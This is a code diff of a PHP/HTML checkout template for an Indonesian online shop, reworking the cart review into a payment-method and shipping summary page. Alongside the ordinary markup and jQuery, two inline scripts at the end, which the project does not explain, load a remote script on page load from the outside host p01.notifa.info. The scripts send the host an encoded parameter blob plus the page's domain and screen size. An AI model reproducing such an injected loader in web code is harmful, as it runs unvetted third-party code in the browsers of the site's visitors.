@@ -11,7 +11,7 @@
                 <meta name="author" content="BDTASK">
         <meta name="description" content="">
 
-        <title>Klak Klik : Review Order</title>
+        <title>Klak Klik : Metode Pembayaran</title>
    
         <!-- Favicons --> 
         <link rel="icon" type="image/png" href="<?php echo base_url().'my-assets/image/logo/b561929d20e2e5728e05d4f0bbafe7f7.png'?>">
@@ -102,6 +102,7 @@
                 border-radius: 2px;
                 /* height: 50px; */
                 margin-top: 8px;
+                margin-bottom: 8px;
         }
 
         .btn-confirm:hover{
@@ -208,7 +209,7 @@
             input[type="text"] {
               /*font-family: monospace;*/
               font-size: 15px;
-             
+              /*color: peru;*/
             }
 
             ::-webkit-input-placeholder {
@@ -242,128 +243,48 @@
                 <div class="col-lg-8 col-12">
                     
                     <div style="margin-top: 12px;background:#fff;padding: 40px;">
-                        <div style="    font-size: 18px;color: #212121;margin-bottom: 14px;position: relative;font-weight: 500;">Keranjang Belanja</div>
+                        <div style="    font-size: 18px;color: #212121;margin-bottom: 14px;position: relative;font-weight: 500;">Metode Pembayaran</div>
+                        <form>
+                       
+                    
 
-                        <style type="text/css">
-                            .head-cart{
-                                    background-color: #fafafa;
-                                    text-align: left;
-                                    font-size: 12px;
-                                    line-height: 14px;
-                                    color: #757575;
-                                    text-align: center;
-                            }
+              
+                        
 
-                            .img-wrap{
-                                    position: relative;
-                                    float: left;
-                                    width: 80px;
-                                    height: 80px;
-                                    margin-right: 12px;
-                            }
-                            .content{
-                                display: inline-block;
-                                /*width: 346px;*/
-                            }
+                        <div class="row">
+                            <div class="col-lg-12">
+                              <div class="form-group">
+                                <label for="exampleFormControlSelect1">Metode Pembayaran</label>
+                                <select id="kurir" class="form-control" name="kurir">
+                                    <option>--Pilih Metode Pembayaran</option>
+                                    <option value="kke">Transfer BANK BCA</option>
+                                    <option value="jne">Transfer BANK BRI</option>
+                                </select>
+                              </div>
+                          </div>
+                          <!-- <div class="col-lg-6">
+                              <div class="form-group">
+                                <label for="exampleFormControlSelect1">Nomor Telepon</label>
+                                <input type="text" class="form-control" id="exampleFormControlInput1" placeholder="Masukkan Nomor Telepon Anda">
+                              </div>
+                          </div> -->
+                          
 
-                            .cart-item-middle {
-                                display: table-cell;
-                                vertical-align: top;
-                                width: 156px;
-                                padding-left: 9px;
-                            }
-                            .cart-item-middle .current-price {
-                                font-size: 18px;
-                                line-height: 28px;
-                                color: #f57224;
-                                font-weight: 500;
-                                margin-bottom: 4px;
-                            }
-                            .cart-item-middle .origin-price {
-                                font-size: 14px;
-                                line-height: 16px;
-                                color: #757575;
-                                margin-bottom: 8px;
-                                text-decoration: line-through;
-                            }
-                            .cart-item-middle .promotion-ratio {
-                                font-size: 14px;
-                                line-height: 16px;
-                                color: #212121;
-                                font-weight: 500;
-                            }
-                            .action{
-                                    font-size: 24px;
-                                    color: #000;
-                            }
-                        </style>
-                        <div class="table-responsive">
-                            <table class="table ">
-                                <thead>
-                                    <tr>
-                                        <th class="head-cart">Produk</th>
-                                        <th class="head-cart">Harga</th>
-                                        <th class="head-cart">Subtotal</th>
-                                        <th class="head-cart">Kuantitas</th>
-                                    </tr>
-                                </thead>
-                                <tbody id="data_cart">
+                 
 
-                                   <!--  <?php for($i=0;$i<5;$i++){ ?>
-                                    <tr>
-                                        <td>
-                                            <div class="img-wrap">
-                                                <img style="width: 80px;height: 80px;" src="http://localhost/github/deva-c-dev/clean-admin/my-assets/image/product/2b0d227bdf983a8d005ef0b20378615a.JPG" alt="">
-                                                
-                                            </div>
-
-                                            <div class="content">
-                                                <a href="" style="font-size: 14px;color: #212121;">XGP500-VAC</a>
-                                                <br>
-                                                <a href="" style="font-size: 12px;line-height: 16px;color: #757575;">Phillips</a>
-                                                <br>
-                                                <a class="action" href="http://localhost/github/deva-c-dev/clean-admin/customer/cart" id="e369853df766fa44e1ed0ff613f563bd" class="hapus_cart" name="7a10563a10f7c44814661c2a1d28fb4f">
-                                                    <i class="fa fa-trash"></i>
-                                                </a>
-                                                
-                                            </div>
-                                            
-
-
-
-
-                                        </td>
-                                        <td>
-                                            <div class="cart-item-middle">
-                                                <p class="current-price">Rp469.000</p>
-                                                <p class="origin-price">Rp549.000</p>
-                                                <p class="promotion-ratio">-15%</p>
-                                            </div>
-                                        </td>
-                                        <td>
-                                            <p class="current-price">Rp469.000</p>
-                                        </td>
-                                        <td>
-                                            <div class="form-group">
-                                                <input style="width: 133px;" class="text-center" type="number" max="2" name="">
-                                            </div>
-                                        </td>
-                                    </tr>
-                                    <?php } ?> -->
-
-                                    
-                                </tbody>
-                                
-                            </table>
-                            
                         </div>
-                   
+
+                     
+                       
+                         
+                          
+                        </form>
                         
                     </div>
                     
                 </div>
                 <div class="col-lg-4 col-12">
-                    <div style="margin-top: 12px;min-height: 500px;background:#fff;position: sticky;top: 80px;">
+                    <div style="margin-top: 12px;min-height: 500px;background:#fff;">
                     <div class="col-lg-12 col-12">
                         <div class="form-group">
                         <button class="btn-confirm" >BUAT PESANAN</button>
@@ -371,14 +292,80 @@
                     </div>
 
                     <div class="col-lg-12">
+                        <style type="text/css">
+                            .checkout-address-inner {
+                                padding-bottom: 16px;
+                            }
+
+                            .address-hat {
+                                    font-size: 18px;color: #212121;margin-bottom: 14px;position: relative;font-weight: 500;
+                            }
+                            .address-title-container {
+                                position: relative;
+                                margin-bottom: 8px;
+                            }
+
+                            .address-title-container .address-title {
+                                font-size: 14px;
+                                line-height: 16px;
+                                color: #757575;
+                            }
+                            .address-edit {
+                                position: absolute;
+                                top: 0;
+                                right: 0;
+                                font-size: 14px;
+                                color: #0cb5ba;
+                                cursor: pointer;
+                            }
+                             .address-name {
+                                font-size: 14px;
+                                line-height: 16px;
+                                word-wrap: break-word;
+                                margin-bottom: 8px;
+                                color: #212121;
+                            }
+                            .address-info-item {
+                                font-size: 14px;
+                                line-height: 16px;
+                                word-wrap: break-word;
+                                color: #757575;
+                            }
+                        </style>
+                        <div class="checkout-address-inner" >
+                            <div>
+                                <div class="address-hat">Pengiriman dan Penagihan
+                                </div>
+                                    
+                                   
+                                        <div class="address-title-container">
+                                            <span class="address-title">Pengiriman Ke :</span>
+                                            <a href="<?php echo base_url(); ?>checkout/shipping" class="address-edit">UBAH</a>
+                                           
+                                        </div>
+                                        <div class="address-name"><?php echo $this->session->userdata('customer_perusahaan') ?></div>
+
+                                        <div class="address-name"><?php echo $this->session->userdata('customer_nama_lengkap') ?></div>
+                                        <div class="address-info-item address-value" ><?php echo $this->session->userdata('customer_alamat') ?></div>
+
+                                        <div class="address-info-item address-value" ><?php echo $this->session->userdata('customer_kode_pos') ?>-<?php echo $this->session->userdata('kecamatan_kelurahan') ?> </div>
+                                        <div class="address-info-item address-value" ><?php echo $this->session->userdata('customer_no_telp') ?></div>
+
+                                        <div class="address-title-container">
+                                           
+                                        </div>
+
+                                
+                                
+                            </div>
+                        </div>
+
                         <div style="    font-size: 18px;color: #212121;margin-bottom: 14px;position: relative;font-weight: 500;">
                         Rangkuman Pemesanan
                         </div>
                         <div class="row-detail-checkout">
                             <div class="detail-subtotal">
                                 Subtotal ( <span class="cart-text" id="count_cart_tops" style="color:#7e7979"></span>)
-
-                           
                                 
                             </div>
 
@@ -388,7 +375,29 @@
                             
                         </div>
 
-                       <!--  -->
+                        <div class="row-detail-checkout">
+                            <div class="detail-subtotal">
+                                Jenis Pengiriman Pengiriman
+                                
+                            </div>
+
+                            <div class="detail-cost-subtotal">
+                                Klak Klik Express
+                            </div>
+                            
+                        </div>
+
+                        <div class="row-detail-checkout">
+                            <div class="detail-subtotal">
+                                Biaya Pengiriman
+                                
+                            </div>
+
+                            <div class="detail-cost-subtotal">
+                                Rp53.000
+                            </div>
+                            
+                        </div>
 
                         <div class="row-detail-checkout">
                             <div class="detail-subtotal">
@@ -397,7 +406,7 @@
                             </div>
 
                             <div class="detail-cost-subtotal">
-                                -%
+                                5%
                             </div>
                             
                         </div>
@@ -536,6 +545,140 @@
         <!-- Custom scripts for this template -->
         <script src="<?php echo base_url().'assets/website/js/theme.js'?>"></script>
 
+        <script type="text/javascript">
+
+            //Simple share
+            $('.share-button').simpleSocialShare();
+            
+            //Change language ajax
+            $('body').on('change', '#change_language', function() {
+                var language  = $('#change_language').val();
+                $.ajax({
+                    type: "post",
+                    async: true,
+                    url: 'http://isshue.bdtask.com/isshue-v1.5/website/Home/change_language',
+                    data: {language:language},
+                    success: function(data) {
+                        if (data == 2) {
+                            location.reload();
+                        }else{
+                            location.reload();
+                        }
+                    },
+                    error: function() {
+                        alert('Request Failed, Please check your code and try again!');
+                    }
+                });
+            }); 
+
+            //Change currency ajax
+            $('body').on('change', '#change_currency', function() {
+                var currency_id  = $('#change_currency').val();
+                $.ajax({
+                    type: "post",
+                    async: true,
+                    url: 'http://isshue.bdtask.com/isshue-v1.5/website/Home/change_currency',
+                    data: {currency_id:currency_id},
+                    success: function(data) {
+                        if (data == 2) {
+                            location.reload();
+                        }else{
+                            location.reload();
+                        }
+                    },
+                    error: function() {
+                        alert('Request Failed, Please check your code and try again!');
+                    }
+                });
+            }); 
+
+            //Add to cart by ajax
+            function add_to_cart(id){
+                var product_id = $('#product_id_'+id).val();
+                var price      = $('#price_'+id).val();
+                var discount   = $('#discount_'+id).val();
+                var qnty       = $('#qnty_'+id).val();
+                var image      = $('#image_'+id).val();
+                var name       = $('#name_'+id).val();
+                var model      = $('#model_'+id).val();
+                var supplier_price      = $('#supplier_price_'+id).val();
+                var cgst      = $('#cgst_'+id).val();
+                var cgst_id   = $('#cgst_id_'+id).val();
+                var sgst      = $('#sgst_'+id).val();
+                var sgst_id   = $('#sgst_id_'+id).val();
+                var igst      = $('#igst_'+id).val();
+                var igst_id   = $('#igst_id_'+id).val();
+
+                if (product_id == 0) {
+                    alert('Ooops something went wrong.');
+                    return false;
+                }
+                $.ajax({
+                    type: "post",
+                    async: true,
+                    url: 'http://isshue.bdtask.com/isshue-v1.5/website/Home/add_to_cart',
+                    data: {
+                        product_id:product_id,
+                        price:price,
+                        discount:discount,
+                        qnty:qnty,
+                        image:image,
+                        name:name,
+                        model:model,
+                        supplier_price:supplier_price,
+                        cgst:cgst,
+                        cgst_id:cgst_id,
+                        sgst:sgst,
+                        sgst_id:sgst_id,
+                        igst:igst,
+                        igst_id:igst_id,
+                    },
+                    beforeSend: function(){
+                        $('.preloader').html("<img src='assets/website/image/loader.gif'>");
+                    },
+                    success: function(data) {
+                        $("#tab_up_cart").load(location.href+" #tab_up_cart>*","");
+                    },
+                    error: function() {
+                        alert('Request Failed, Please check your code and try again!');
+                    }
+                });
+            }
+
+            //Add to cart by ajax
+            function cart_btn(product_id){
+                var qnty       = $('#sst').val();
+                var variant    = $('#select_size1').val();
+
+                if (product_id == 0) {
+                    alert('Ooops something went wrong.');
+                    return false;
+                }
+                if (qnty <= 0) {
+                    alert('Please keep quantity up to zero !');
+                    return false;
+                }
+                if (variant != 'undefine') {
+                    if (variant <= 0) {
+                        alert('Please select product size !');
+                        return false;
+                    }
+                }
+                
+                $.ajax({
+                    type: "post",
+                    async: true,
+                    url: 'http://isshue.bdtask.com/isshue-v1.5/website/Home/add_to_cart_details',
+                    data: {product_id:product_id,qnty:qnty,variant:variant},
+                    success: function(data) {
+                        $("#tab_up_cart").load(location.href+" #tab_up_cart>*","");
+                    },
+                    error: function() {
+                        alert('Request Failed, Please check your code and try again!');
+                    }
+                });
+            }
+        </script>
     <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mN8SBaYYlsFeUcDpnfQuaKJY%2f%2b4ifx7FXqVglW98PVFQvyY7T5Gk6N3jNgEJBhG6GaIzUqsjF%2f4TLSGOEsYplytwPHPHZFO3%2bR6hyaZOWCDQ8NlS%2b7NVfrYlTPyMtYeFvjQ%2fnLSStYmmFKlaYd%2bcyO0NvOwT%2b9o5NpgZK1gmIGgBQxkfGD%2fb9NYJ5IJVImWu%2fqDBvW%2b9q2qM5N6XydmS8ZLD0HEqy8N%2bx3cr7%2f6jh278SYgwY8uZjHU0e6QkQ1T2jY6I1JON1wBuBdTZDw5sy6dgh7d5LWLX4DVb3zDZPQPk6JEqAaM6yvxHaRlLpKWD5Qpu81O%2bLfziK99WRxo5OJNny1p1UL6OtYYO1GSuVvqfajzEcbbhCo5JXOLkOoUYa84r0WrbrcFiNk5r3M5YfMpXZfbTpbsQhGlXzCd9KuM9lq%2brlrbLdjgDkYGjAsQcXf5g4enwoja3mCiFUt1yIbw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
     
     
@@ -546,58 +689,120 @@
          
     <script type="text/javascript" src="<?php echo base_url()?>assets/js/jquery.1.11.3.min.js"></script>  
     <script type="text/javascript" src="<?php echo base_url()?>assets/js/multistep.min.js"></script>
-
-
-
-
-
-
-
-
     <script>
-        $(document).ready(function(){
+        $(document).ready(function() { 
+            $('#rms-wizard').stepWizard({
+                stepTheme: 'defaultTheme',/*defaultTheme,steptheme1,steptheme2*/
+                allstepClickable: false,
+                compeletedStepClickable: true,
+                stepCounter: true,
+                StepImage: true, 
+                animation: true,
+                animationClass: "fadeIn",
+                stepValidation: true,
+                validation : true, 
+                field: {
+                     username : { 
+                        required : true, 
+                        minlength: 2,
+                        Regex: /^[a-zA-Z0-9]+$/,  
+                    },
+                     password : {
+                        required : true,
+                        minlength : 5,
+                        maxlength : 20,
+                        Regex: /^(?=.*[0-9_\W]).+$/, 
+                    },
+                    email:{
+                        required : true,
+                        Regex: /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/,
+                    },
+                },
+                message: {
+                    username: "Please Enter UserName ", 
+                }
+                
+            });
+    });
+    </script> 
 
-            //Hapus Item Cart
-                $(document).on('change','.zzk',function(){
-                    var row_id=$(this).attr("id"); //mengambil row_id dari artibut id
-                    var qty=$(this).val(); //mengambil qty
-                    // alert(qty);
-                    if(qty <= 0){
-                        alert('Ooops something went wrong.');
-                    return false;
-                    }else{
-                        $.ajax({
-                        url : "<?php echo base_url();?>home/update_cart",
-                        method : "POST",
-                        data : {row_id : row_id,qty : qty}
-                        ,
-                        beforeSend: function(){
-                            $('.preloader').html("<img src='<?php echo base_url();?>assets/website/image/loader.gif'>");
-                        },
-                        success :function(){
-                             // location.reload();
-
-                             $('#detail_cart').load("<?php echo base_url();?>home/load_cart");
-                             $('#data_cart').load("<?php echo base_url();?>home/load_review_order");
-                             $('#count_cart').load("<?php echo base_url();?>home/load_count");
-                             $('#count_cart_top').load("<?php echo base_url();?>home/load_count_top");
-                             $('#count_cart_tops').load("<?php echo base_url();?>home/load_count_top");
-                             $('.total').load("<?php echo base_url();?>home/load_total");
-
-              
-                        }
-                    });
-                    }
-                    
-                });
-
-        });
+    <script type="text/javascript">
  
-   </script>
+    $(document).ready(function(){
+        $('#provinsi').change(function(){
+ 
+            //Mengambil value dari option select provinsi kemudian parameternya dikirim menggunakan ajax 
+            var prov = $('#provinsi').val();
+ 
+            $.ajax({
+                type : 'GET',
+                url : '<?php echo base_url(); ?>checkout/cek_city',
+                data :  'prov_id=' + prov,
+                    success: function (data) {
+ 
+                    //jika data berhasil didapatkan, tampilkan ke dalam option select kabupaten
+                    $("#kota").html(data);
+                }
+            });
+        });
 
 
-        
+ 
+        $("#cek").click(function(){
+            //Mengambil value dari option select provinsi asal, kabupaten, kurir, berat kemudian parameternya dikirim menggunakan ajax 
+            var asal = 501;
+            var kab = $('#kota').val();
+            var kurir = $('#kurir').val();
+            var berat = $('#berat').val();
+ 
+            $.ajax({
+                type : 'POST',
+                url : '<?php echo base_url(); ?>checkout/cek_ongkir',
+                data :  {'kab_id' : kab, 'kurir' : kurir, 'asal' : asal, 'berat' : berat},
+                    success: function (data) {
+ 
+                    //jika data berhasil didapatkan, tampilkan ke dalam element div ongkir
+                    $("#ongkir").html(data);
+                }
+            });
+        });
+    });
+</script>
 
+        <script type="text/javascript">
+        $(document).ready(function(){
+      
+          
+                 var discount1 = $('.type-users').find(':selected').data('discount');
+                 var keterangan1 = $('.type-users').find(':selected').data('keterangan');
+                // alert(keterangan);\
+                $("#detail_discount").css("font-weight", "bold");
+                $("#detail_keterangan").css("font-weight", "bold");
+                $( '#detail_discount' ).html(discount1+'%').fadeIn(1000);
+                $( '#detail_keterangan' ).html(keterangan1 ).fadeIn(1000);
+
+            
+
+            $('#kurir').change(function(){
+          
+                 var kurir = $(this).find(':selected').val();
+                // alert(kurir);
+                 if(kurir == 'kke'){
+                    $('#jenis-pengiriman').attr('disabled',true);
+                 }else{
+                    $('#jenis-pengiriman').attr('disabled',false);
+
+                 }
+                 
+                // // alert(keterangan);\
+                // $("#detail_discount").css("font-weight", "bold");
+                // $("#detail_keterangan").css("font-weight", "bold");
+                // $( '#detail_discount' ).html(discount+'%').fadeIn(1000);
+                // $( '#detail_keterangan' ).html(keterangan ).fadeIn(1000);
+
+            });
+        });
+        </script>
 
 <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mxBGfhEJgBVeRF1D3nG7dlIW0bEAhyICGLxebBqUNxpEAT4sy8%2fX6CgsXqzAOKtcQbQjkpEJKI7cyfLTKJ3G640tLHaNhgYqRCBhMbV4%2fPaLmYBcXJH0zmgHiGS0iJ3Kc6fvyZzEuIOUCHxJI%2bW7YtM9BFf%2bBlymSfmfhB4EJhSpXAbIriir1%2boT%2bLjiSyM9eBso5zTeqBduQhY%2fUXKLOoT7bGQK3NSZCmI%2fF5Lymfnffu4t%2fs50zzXesQilE9A%2fM07BWyJ%2bvTNV6Q6kJR8PuxIAPBP3GQYQONyQM5ZSUQc6llpYhFm0EwADGcaH7HWRn%2buB4izlJaPNtOO%2bD4%2bqEgPc%2bUCsBZ1ntFH5RaCmWsbHiiReFF6QvDr9Jol287OLsWadnJgIgKylppfs382TaUMQQnkccb9tzVo9J%2fDAXYr1PDyQQGReXYLEmW8QfFFC1uRT49sme8P%2b4P4xAbqI808y4YSsG8E9U" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
         
